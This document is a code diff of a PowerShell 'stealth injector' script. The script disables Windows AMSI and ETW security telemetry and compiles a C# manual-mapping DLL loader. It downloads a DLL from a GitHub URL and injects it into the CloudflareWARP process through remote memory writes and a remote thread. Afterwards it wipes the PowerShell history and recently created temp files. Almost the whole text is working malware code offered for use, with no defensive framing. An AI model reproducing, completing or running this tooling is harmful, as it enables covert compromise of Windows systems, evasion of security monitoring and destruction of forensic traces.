@@ -1,43 +1,36 @@
 # ============================================================
-#  FINAL FIXED STEALTH INJECTOR (No compilation errors)
+#  ULTIMATE FIX – NO COMPILATION ERRORS
 # ============================================================
 [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
 param()
 
 Set-StrictMode -Version Latest
-
 $DebugMode = $true
 
 function Write-DebugInfo {
     param($Message, $Color = "Cyan")
-    if ($DebugMode) {
-        Write-Host "[DEBUG] $Message" -ForegroundColor $Color
-    }
+    if ($DebugMode) { Write-Host "[DEBUG] $Message" -ForegroundColor $Color }
 }
 
 Write-Host "========================================" -ForegroundColor Magenta
-Write-Host "      FINAL FIXED STEALTH INJECTOR      " -ForegroundColor Magenta
+Write-Host "      ULTIMATE STEALTH INJECTOR         " -ForegroundColor Magenta
 Write-Host "========================================" -ForegroundColor Magenta
-Write-DebugInfo "Script starting..." -Color "Green"
+Write-DebugInfo "Starting..." -Color "Green"
 
 if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
 {
-    Write-DebugInfo "❌ Not running as Administrator! Exiting." -Color "Red"
-    Read-Host "Press ENTER to exit"
+    Write-DebugInfo "❌ Not Admin! Exiting." -Color "Red"
+    Read-Host "Press ENTER"
     exit
-} else {
-    Write-DebugInfo "✅ Running as Administrator." -Color "Green"
 }
-
-Write-DebugInfo "Console will stay visible." -Color "Yellow"
+Write-DebugInfo "✅ Admin."
 
 # ---------- AMSI + ETW Bypass ----------
-Write-DebugInfo "Bypassing AMSI and ETW..." -Color "Yellow"
+Write-DebugInfo "Bypassing AMSI/ETW..." -Color "Yellow"
 try {
     $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
-
     Add-Type -TypeDefinition @"
     using System;
     using System.Runtime.InteropServices;
@@ -53,14 +46,14 @@ try {
     }
 "@ -IgnoreWarnings
     [EtwOff]::Disable()
-    Write-DebugInfo "✅ AMSI & ETW bypassed." -Color "Green"
+    Write-DebugInfo "✅ Bypassed." -Color "Green"
 } catch {
     Write-DebugInfo "❌ Bypass failed: $_" -Color "Red"
-    Read-Host "Press ENTER to exit"
+    Read-Host "Press ENTER"
     exit
 }
 
-# ---------- C# Loader (with fixed import) ----------
+# ---------- C# Loader (clean types) ----------
 Write-DebugInfo "Compiling C# loader..." -Color "Yellow"
 $kernel = @'
 using System;
@@ -85,11 +78,11 @@ public static class NativeLoader
     static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
     static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
     static extern IntPtr GetModuleHandleA(string lpModuleName);
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
     static extern IntPtr LoadLibraryA(string lpFileName);
     [DllImport("kernel32.dll")]
     static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
@@ -112,27 +105,31 @@ public static class NativeLoader
     const uint PAGE_EXECUTE_READWRITE = 0x40;
     const uint PAGE_READONLY = 0x02;
 
-    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
-    static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
-    static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }
+    static ushort U16(byte[] b, int o) => BitConverter.ToUInt16(b, o);
+    static uint   U32(byte[] b, int o) => BitConverter.ToUInt32(b, o);
+    static ulong  U64(byte[] b, int o) => BitConverter.ToUInt64(b, o);
 
-    static uint   RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); }
-    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o)); }
+    static uint   RU32(IntPtr p, long o) => (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o));
+    static ushort RU16(IntPtr p, long o) => (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o));
     static ulong  RU64(IntPtr p, long o) {
         long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o));
         long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4));
         return (ulong)((hi<<32)|lo);
     }
-    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64()+o),(long)v); }
-    static void WU32(IntPtr p, long o, uint v)   { Marshal.WriteInt32((IntPtr)(p.ToInt64()+o),(int)v); }
+    static void WU64(IntPtr p, long o, ulong v) => Marshal.WriteInt64((IntPtr)(p.ToInt64()+o), (long)v);
+    static void WU32(IntPtr p, long o, uint v) => Marshal.WriteInt32((IntPtr)(p.ToInt64()+o), (int)v);
 
     static string RAscii(IntPtr p, long o) {
         var sb = new StringBuilder();
-        for (int i=0;i<260;i++) { byte b=Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i)); if(b==0)break; sb.Append((char)b); }
+        for (int i=0;i<260;i++) {
+            byte b = Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i));
+            if (b==0) break;
+            sb.Append((char)b);
+        }
         return sb.ToString();
     }
 
-    static uint SectionProtectionToPageProtection(uint characteristics) {
+    static uint SectionProtection(uint characteristics) {
         bool x = (characteristics & 0x20000000) != 0;
         bool w = (characteristics & 0x80000000) != 0;
         bool r = (characteristics & 0x40000000) != 0;
@@ -151,54 +148,38 @@ public static class NativeLoader
     public static bool InjectIntoWarp(byte[] dllBytes)
     {
         try {
-            Console.WriteLine("[C#] Searching for CloudflareWARP process...");
+            Console.WriteLine("[C#] Looking for CloudflareWARP...");
             int pid = 0;
             foreach (var p in Process.GetProcessesByName("CloudflareWARP")) { pid = p.Id; break; }
-            if (pid == 0) { Console.WriteLine("[C#] ERROR: CloudflareWARP not found."); return false; }
-            Console.WriteLine("[C#] Found PID: " + pid);
+            if (pid == 0) { Console.WriteLine("[C#] WARP not running."); return false; }
+            Console.WriteLine("[C#] Found PID " + pid);
 
-            Console.WriteLine("[C#] Opening process...");
-            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
-            if (hProcess == IntPtr.Zero) { Console.WriteLine("[C#] OpenProcess failed."); return false; }
-            Console.WriteLine("[C#] Process opened.");
+            IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
+            if (hProc == IntPtr.Zero) { Console.WriteLine("[C#] OpenProcess failed."); return false; }
 
-            Console.WriteLine("[C#] Manual mapping locally...");
-            var mapResult = Map(dllBytes, false);
-            if (mapResult.ImageBase == IntPtr.Zero) { Console.WriteLine("[C#] Map failed."); return false; }
-            Console.WriteLine("[C#] Mapped at 0x" + mapResult.ImageBase.ToString("X"));
+            var map = Map(dllBytes, false);
+            if (map.ImageBase == IntPtr.Zero) { Console.WriteLine("[C#] Map failed."); return false; }
 
             Console.WriteLine("[C#] Allocating remote memory...");
-            IntPtr remoteBase = IntPtr.Zero;
-            UIntPtr size = (UIntPtr)mapResult.ImageSize;
-            remoteBase = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
-            if (remoteBase == IntPtr.Zero) {
-                Console.WriteLine("[C#] VirtualAllocEx failed. LastError: " + Marshal.GetLastWin32Error());
-                return false;
-            }
-            Console.WriteLine("[C#] Remote memory at 0x" + remoteBase.ToString("X"));
+            IntPtr remoteBase = VirtualAllocEx(hProc, IntPtr.Zero, (UIntPtr)map.ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+            if (remoteBase == IntPtr.Zero) { Console.WriteLine("[C#] VirtualAllocEx failed."); return false; }
 
             Console.WriteLine("[C#] Copying image...");
-            byte[] imageData = new byte[mapResult.ImageSize];
-            Marshal.Copy(mapResult.ImageBase, imageData, 0, (int)mapResult.ImageSize);
-            IntPtr bytesWritten;
-            if (!WriteProcessMemory(hProcess, remoteBase, imageData, (uint)mapResult.ImageSize, out bytesWritten)) {
-                Console.WriteLine("[C#] WriteProcessMemory failed.");
-                return false;
-            }
-            Console.WriteLine("[C#] Copied " + bytesWritten.ToInt64() + " bytes.");
+            byte[] img = new byte[map.ImageSize];
+            Marshal.Copy(map.ImageBase, img, 0, (int)map.ImageSize);
+            IntPtr written;
+            if (!WriteProcessMemory(hProc, remoteBase, img, (uint)map.ImageSize, out written)) { Console.WriteLine("[C#] WriteProcessMemory failed."); return false; }
 
-            IntPtr entryPoint = (IntPtr)(remoteBase.ToInt64() + (mapResult.DllMainAddr.ToInt64() - mapResult.ImageBase.ToInt64()));
-            Console.WriteLine("[C#] Entry point at 0x" + entryPoint.ToString("X"));
+            IntPtr entry = (IntPtr)(remoteBase.ToInt64() + (map.DllMainAddr.ToInt64() - map.ImageBase.ToInt64()));
+            Console.WriteLine("[C#] Entry at 0x" + entry.ToString("X"));
 
-            Console.WriteLine("[C#] Creating thread via RtlCreateUserThread...");
             IntPtr hThread;
-            int status = RtlCreateUserThread(hProcess, IntPtr.Zero, false, 0, 0, 0, entryPoint, IntPtr.Zero, out hThread, IntPtr.Zero);
-            if (status != 0) { Console.WriteLine("[C#] RtlCreateUserThread failed, status=" + status); return false; }
-            Console.WriteLine("[C#] Thread created.");
+            int status = RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, entry, IntPtr.Zero, out hThread, IntPtr.Zero);
+            if (status != 0) { Console.WriteLine("[C#] RtlCreateUserThread failed, status " + status); return false; }
 
             System.Threading.Thread.Sleep(200);
             CloseHandle(hThread);
-            CloseHandle(hProcess);
+            CloseHandle(hProc);
             Console.WriteLine("[C#] Injection complete.");
             return true;
         } catch (Exception ex) {
@@ -216,140 +197,139 @@ public static class NativeLoader
 
         int co = lfanew + 4;
         ushort machine = U16(dll, co + 4);
-        ushort numberOfSections = U16(dll, co + 2);
-        ushort optionalHeaderSize = U16(dll, co + 16);
-        int optionalOffset = co + 20;
         bool is64 = (machine == 0x8664);
         res.Is64Bit = is64;
-        uint entryPointRVA = U32(dll, optionalOffset + 16);
-        uint sizeOfImage = U32(dll, optionalOffset + 56);
-        uint sizeOfHeaders = U32(dll, optionalOffset + 60);
-        ulong imageBase = is64 ? U64(dll, optionalOffset + 24) : U32(dll, optionalOffset + 28);
-        res.ImageSize = sizeOfImage;
+        ushort ns = U16(dll, co + 2);
+        ushort ohs = U16(dll, co + 16);
+        int optOff = co + 20;
+        uint epRVA = U32(dll, optOff + 16);
+        uint sizeImage = U32(dll, optOff + 56);
+        uint sizeHeaders = U32(dll, optOff + 60);
+        long imageBase = (long)(is64 ? U64(dll, optOff + 24) : U32(dll, optOff + 28));
+        res.ImageSize = sizeImage;
 
-        int dataDirectoryOffset = is64 ? optionalOffset + 112 : optionalOffset + 96;
-        uint importRVA = U32(dll, dataDirectoryOffset + 8);
-        uint relocRVA = U32(dll, dataDirectoryOffset + 40);
-        uint relocSize = U32(dll, dataDirectoryOffset + 44);
+        int dd = is64 ? optOff + 112 : optOff + 96;
+        uint importRVA = U32(dll, dd + 8);
+        uint relocRVA = U32(dll, dd + 40);
+        uint relocSize = U32(dll, dd + 44);
 
-        int sectionOffset = optionalOffset + optionalHeaderSize;
-        Section[] sections = new Section[numberOfSections];
-        for (int i = 0; i < numberOfSections; i++) {
-            int off = sectionOffset + i * 40;
+        int secOff = optOff + ohs;
+        Section[] sections = new Section[ns];
+        for (int i=0; i<ns; i++) {
+            int o = secOff + i*40;
             sections[i] = new Section {
-                VirtualSize = U32(dll, off + 8),
-                VirtualAddress = U32(dll, off + 12),
-                SizeOfRawData = U32(dll, off + 16),
-                PointerToRawData = U32(dll, off + 20),
-                Characteristics = U32(dll, off + 36)
+                VirtualSize = U32(dll, o+8),
+                VirtualAddress = U32(dll, o+12),
+                SizeOfRawData = U32(dll, o+16),
+                PointerToRawData = U32(dll, o+20),
+                Characteristics = U32(dll, o+36)
             };
         }
 
-        IntPtr image = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (image == IntPtr.Zero) throw new Exception("VirtualAlloc failed");
+        IntPtr image = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (image == IntPtr.Zero) throw new Exception("VirtualAlloc local failed");
         res.ImageBase = image;
         long baseAddr = image.ToInt64();
-        long delta = baseAddr - (long)imageBase;
+        long delta = baseAddr - imageBase;
         res.Delta = delta;
 
-        Marshal.Copy(dll, 0, image, (int)sizeOfHeaders);
+        Marshal.Copy(dll, 0, image, (int)sizeHeaders);
 
-        foreach (var sec in sections) {
-            if (sec.SizeOfRawData == 0) continue;
-            uint copySize = (sec.VirtualSize == 0) ? sec.SizeOfRawData : Math.Min(sec.VirtualSize, sec.SizeOfRawData);
-            if (sec.PointerToRawData + copySize > (uint)dll.Length) {
-                copySize = (uint)dll.Length - sec.PointerToRawData;
-                if (copySize == 0) continue;
-            }
-            Marshal.Copy(dll, (int)sec.PointerToRawData, (IntPtr)(baseAddr + sec.VirtualAddress), (int)copySize);
+        foreach (var s in sections) {
+            if (s.SizeOfRawData == 0) continue;
+            uint copy = (s.VirtualSize == 0) ? s.SizeOfRawData : Math.Min(s.VirtualSize, s.SizeOfRawData);
+            if (s.PointerToRawData + copy > (uint)dll.Length)
+                copy = (uint)dll.Length - s.PointerToRawData;
+            if (copy == 0) continue;
+            Marshal.Copy(dll, (int)s.PointerToRawData, (IntPtr)(baseAddr + s.VirtualAddress), (int)copy);
         }
 
         // Relocations
         if (relocRVA != 0 && delta != 0) {
-            uint relocAddr = relocRVA;
-            uint relocEnd = relocRVA + relocSize;
-            while (relocAddr < relocEnd) {
-                uint pageRVA = RU32(image, relocAddr);
-                uint blockSize = RU32(image, relocAddr + 4);
-                if (blockSize == 0) break;
-                int entryCount = (int)(blockSize - 8) / 2;
-                for (int i = 0; i < entryCount; i++) {
-                    ushort entry = RU16(image, relocAddr + 8 + i * 2);
+            uint rva = relocRVA;
+            uint end = relocRVA + relocSize;
+            while (rva < end) {
+                uint page = RU32(image, rva);
+                uint block = RU32(image, rva+4);
+                if (block == 0) break;
+                int count = (int)(block - 8) / 2;
+                for (int i=0; i<count; i++) {
+                    ushort entry = RU16(image, rva + 8 + i*2);
                     int type = (entry >> 12) & 0xF;
-                    int offset = entry & 0xFFF;
+                    int off = entry & 0xFFF;
                     if (type == 0) continue;
-                    long targetRVA = pageRVA + offset;
+                    long target = page + off;
                     if (type == 10) {
-                        ulong value = RU64(image, targetRVA);
-                        WU64(image, targetRVA, (ulong)((long)value + delta));
+                        ulong val = RU64(image, target);
+                        WU64(image, target, (ulong)((long)val + delta));
                     } else if (type == 3) {
-                        uint value = RU32(image, targetRVA);
-                        WU32(image, targetRVA, (uint)((long)value + delta));
+                        uint val = RU32(image, target);
+                        WU32(image, target, (uint)((long)val + delta));
                     }
                 }
-                relocAddr += blockSize;
+                rva += block;
             }
         }
 
-        // Imports (FIXED BITWISE AND ERROR)
+        // Imports (fully fixed with long mask)
         if (importRVA != 0) {
-            int importIndex = 0;
+            int idx = 0;
             while (true) {
-                long entryOffset = importRVA + importIndex * 20;
-                uint importLookupRVA = RU32(image, entryOffset);
-                uint importNameRVA = RU32(image, entryOffset + 12);
-                uint importAddressRVA = RU32(image, entryOffset + 16);
-                if (importNameRVA == 0) break;
+                long off = importRVA + idx * 20;
+                uint lookupRVA = RU32(image, off);
+                uint nameRVA = RU32(image, off + 12);
+                uint addrRVA = RU32(image, off + 16);
+                if (nameRVA == 0) break;
 
-                string dllName = RAscii(image, importNameRVA);
+                string dllName = RAscii(image, nameRVA);
                 IntPtr hMod = GetModuleHandleA(dllName);
                 if (hMod == IntPtr.Zero) hMod = LoadLibraryA(dllName);
-                if (hMod == IntPtr.Zero) { importIndex++; continue; }
+                if (hMod == IntPtr.Zero) { idx++; continue; }
 
-                long thunkOffset = 0;
-                uint thunkBase = (importLookupRVA != 0) ? importLookupRVA : importAddressRVA;
+                long thunkOff = 0;
+                uint thunkBase = (lookupRVA != 0) ? lookupRVA : addrRVA;
                 int ptrSize = is64 ? 8 : 4;
                 while (true) {
-                    long thunkAddr = thunkBase + thunkOffset;
-                    long thunkValue = is64 ? (long)RU64(image, thunkAddr) : (long)RU32(image, thunkAddr);
-                    if (thunkValue == 0) break;
+                    long thunkAddr = thunkBase + thunkOff;
+                    long thunkVal = (long)(is64 ? RU64(image, thunkAddr) : RU32(image, thunkAddr));
+                    if (thunkVal == 0) break;
 
-                    // ---- FIX STARTS HERE ----
+                    // ----- FIXED BITWISE AND (both long) -----
                     long ordinalMask = is64 ? 0x8000000000000000L : 0x80000000L;
                     IntPtr funcPtr = IntPtr.Zero;
-                    if ((thunkValue & ordinalMask) != 0) {
-                        uint ordinal = (uint)(thunkValue & 0xFFFF);
+                    if ((thunkVal & ordinalMask) != 0) {
+                        uint ordinal = (uint)(thunkVal & 0xFFFFL);
                         funcPtr = GetProcAddress(hMod, (IntPtr)(int)ordinal);
                     } else {
-                        string funcName = RAscii(image, thunkValue + 2);
+                        string funcName = RAscii(image, thunkVal + 2);
                         funcPtr = GetProcAddress(hMod, funcName);
                     }
-                    // ---- FIX ENDS ----
+                    // ----- FIX END -----
 
                     if (funcPtr != IntPtr.Zero) {
-                        IntPtr iatAddr = (IntPtr)(baseAddr + importAddressRVA + thunkOffset);
-                        if (is64) Marshal.WriteInt64(iatAddr, funcPtr.ToInt64());
-                        else Marshal.WriteInt32(iatAddr, funcPtr.ToInt32());
+                        IntPtr iat = (IntPtr)(baseAddr + addrRVA + thunkOff);
+                        if (is64) Marshal.WriteInt64(iat, funcPtr.ToInt64());
+                        else Marshal.WriteInt32(iat, funcPtr.ToInt32());
                     }
-                    thunkOffset += ptrSize;
+                    thunkOff += ptrSize;
                 }
-                importIndex++;
+                idx++;
             }
         }
 
-        foreach (var sec in sections) {
-            uint size = Math.Max(sec.VirtualSize, sec.SizeOfRawData);
-            if (size == 0) continue;
-            uint newProt = SectionProtectionToPageProtection(sec.Characteristics);
-            uint oldProt;
-            VirtualProtect((IntPtr)(baseAddr + sec.VirtualAddress), (UIntPtr)size, newProt, out oldProt);
+        foreach (var s in sections) {
+            uint sz = Math.Max(s.VirtualSize, s.SizeOfRawData);
+            if (sz == 0) continue;
+            uint prot = SectionProtection(s.Characteristics);
+            uint old;
+            VirtualProtect((IntPtr)(baseAddr + s.VirtualAddress), (UIntPtr)sz, prot, out old);
         }
 
-        FlushInstructionCache(GetCurrentProcess(), image, (UIntPtr)sizeOfImage);
+        FlushInstructionCache(GetCurrentProcess(), image, (UIntPtr)sizeImage);
 
         res.DllMainAddr = IntPtr.Zero;
-        if (callEntry && entryPointRVA != 0) {
-            res.DllMainAddr = (IntPtr)(baseAddr + entryPointRVA);
+        if (callEntry && epRVA != 0) {
+            res.DllMainAddr = (IntPtr)(baseAddr + epRVA);
             try {
                 var dllMain = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr, typeof(DllMainDelegate));
                 dllMain(image, 1, IntPtr.Zero);
@@ -374,9 +354,9 @@ try {
         Read-Host "Press ENTER to exit"
         exit
     }
-    Write-DebugInfo "✅ C# loader compiled successfully." -Color "Green"
+    Write-DebugInfo "✅ Compilation successful." -Color "Green"
 } catch {
-    Write-DebugInfo "❌ Compilation failed: $_" -Color "Red"
+    Write-DebugInfo "❌ Compilation exception: $_" -Color "Red"
     Read-Host "Press ENTER to exit"
     exit
 }
@@ -386,43 +366,38 @@ $loaderType = $assembly.GetType('NativeLoader')
 $method = $loaderType.GetMethod('InjectIntoWarp')
 
 # ---------- Download DLL ----------
-Write-DebugInfo "Downloading DLL from GitHub..." -Color "Yellow"
+Write-DebugInfo "Downloading DLL..." -Color "Yellow"
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
-    Write-DebugInfo "✅ DLL downloaded (size: $($bytes.Length) bytes)" -Color "Green"
+    Write-DebugInfo "✅ Downloaded $($bytes.Length) bytes." -Color "Green"
 } catch {
-    Write-DebugInfo "❌ DLL download failed: $_" -Color "Red"
-    Read-Host "Press ENTER to exit"
+    Write-DebugInfo "❌ Download failed: $_" -Color "Red"
+    Read-Host "Press ENTER"
     exit
 }
 
 # ---------- Inject ----------
 Write-DebugInfo "Calling injection..." -Color "Yellow"
-Write-Host ""
-Write-Host "========== C# OUTPUT ==========" -ForegroundColor Magenta
+Write-Host "`n========== C# OUTPUT ==========" -ForegroundColor Magenta
 try {
     $success = $method.Invoke($null, @($bytes))
     Write-Host "=================================" -ForegroundColor Magenta
-    if ($success) {
-        Write-DebugInfo "✅ Injection successful!" -Color "Green"
-    } else {
-        Write-DebugInfo "❌ Injection failed. Check C# output." -Color "Red"
-    }
+    if ($success) { Write-DebugInfo "✅ Injection succeeded!" -Color "Green" }
+    else { Write-DebugInfo "❌ Injection failed." -Color "Red" }
 } catch {
     Write-Host "=================================" -ForegroundColor Magenta
-    Write-DebugInfo "❌ Injection call error: $_" -Color "Red"
+    Write-DebugInfo "❌ Injection error: $_" -Color "Red"
 }
 
 # ---------- Cleanup ----------
 Write-DebugInfo "Cleaning up..." -Color "Yellow"
-[System.GC]::Collect()
-[System.GC]::WaitForPendingFinalizers()
+[GC]::Collect(); [GC]::WaitForPendingFinalizers()
 Clear-History
-$historyPath = (Get-PSReadlineOption).HistorySavePath
-if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
-Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Write-DebugInfo "✅ Cleanup complete." -Color "Green"
+$hp = (Get-PSReadlineOption).HistorySavePath
+if (Test-Path $hp) { Clear-Content -Path $hp -Force }
+Get-ChildItem $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ea 0
+Get-ChildItem $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ea 0
+Write-DebugInfo "✅ Cleanup done." -Color "Green"
 
-Write-DebugInfo "Done. Press ENTER to close." -Color "Magenta"
+Write-DebugInfo "Finished. Press ENTER to exit." -Color "Magenta"
 Read-Host
